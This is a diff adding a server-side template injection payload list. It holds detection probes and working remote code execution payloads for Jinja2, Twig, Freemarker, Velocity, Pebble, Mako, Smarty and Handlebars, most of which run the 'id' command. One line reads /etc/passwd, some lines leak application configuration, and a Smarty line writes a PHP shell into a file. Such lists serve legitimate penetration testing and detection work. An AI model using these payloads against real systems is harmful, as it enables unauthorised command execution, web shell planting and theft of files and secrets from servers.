@@ -1,0 +1,53 @@
+# Detection - math evaluation (universal)
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{7*7}
+
+# Detection - polyglot / fingerprinting
+${{<%[%'"}}%\.
+{{7*'7'}}
+
+# Detection - error based
+{{foobar}}
+${foobar}
+
+# Jinja2 - configuration leak
+{{config}}
+{{config.items()}}
+{{self.__init__.__globals__.__builtins__}}
+
+# Jinja2 - RCE chains
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# Twig
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{_self.env.display('id')}}
+{{'/etc/passwd'|file_excerpt(1,30)}}
+
+# Freemarker
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign ex="freemarker.template.utility.ObjectConstructor"?new()>${ex("java.lang.Runtime").getRuntime().exec("id")}
+
+# Velocity
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
+
+# Pebble
+{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]))}}
+
+# Mako
+${__import__('os').popen('id').read()}
+<%import os%>${os.popen('id').read()}
+
+# Smarty
+{system('id')}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id');?>",self::clearConfig())}
+
+# Handlebars
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
